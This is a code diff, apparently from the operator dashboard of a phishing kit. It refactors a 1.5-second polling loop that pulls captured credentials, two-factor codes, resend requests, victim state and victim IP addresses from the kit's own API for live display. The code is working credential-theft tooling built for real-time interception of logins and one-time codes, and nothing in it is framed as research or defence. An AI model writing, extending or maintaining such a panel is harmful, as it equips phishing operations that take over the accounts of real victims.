@@ -947,27 +947,12 @@
         }
         
 loadData();
+        loadVictimState();
         
-        setInterval(async () => {
-            const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
-                fetch('/api/get-creds'),
-                fetch('/api/get-2fa'),
-                fetch('/api/get-resend-requests'),
-                fetch('/api/get-state'),
-                fetch('/api/get-ips')
-            ]);
-            
-            const creds = await credsRes.json();
-            const codes = await codesRes.json();
-            const resends = await resendRes.json();
-            const state = await stateRes.json();
-            const ips = await ipsRes.json();
-            
-            renderAll(creds, codes, resends, state, ips);
+        setInterval(function() {
+            loadData();
             loadVictimState();
         }, 1500);
-        
-        loadVictimState();
         
         function filterCredentials() {
             const search = document.getElementById('searchCreds').value.toLowerCase();
